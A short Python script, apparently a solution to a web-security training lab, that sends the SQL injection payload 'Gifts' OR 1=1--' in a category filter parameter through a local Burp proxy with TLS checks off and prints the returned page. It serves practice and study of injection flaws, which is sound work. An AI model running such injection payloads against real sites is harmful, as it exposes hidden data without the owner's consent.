#! /usr/bin/env python

import requests  # to make web requests
import sys  # system module to use for arguments

"""Lab 1: SQL injection vulnerability in the WHERE clause allowing retrieval of hidden data. Script to exploit SQL injection in the filter parameter of the URL. """

# https://0ac300070377a20580f6172000b7008d.web-security-academy.net/filter?category=Gifts


def exploit(base_url: str) -> None:
    response = requests.get(
        base_url + "/filter",
        params={"category": "Gifts' OR 1=1--"},
        proxies={"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"},
        verify=False,
    )  # category is the key and the value is Gifts, everything after the ? are the parameters in the URL also sending through Burp
    print(response.text)


def main() -> None:
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} ,<base_url>")
        exit(1)
    requests.packages.urllib3.disable_warnings()
    exploit(sys.argv[1].rstrip("/"))


if __name__ == "__main__":
    main()
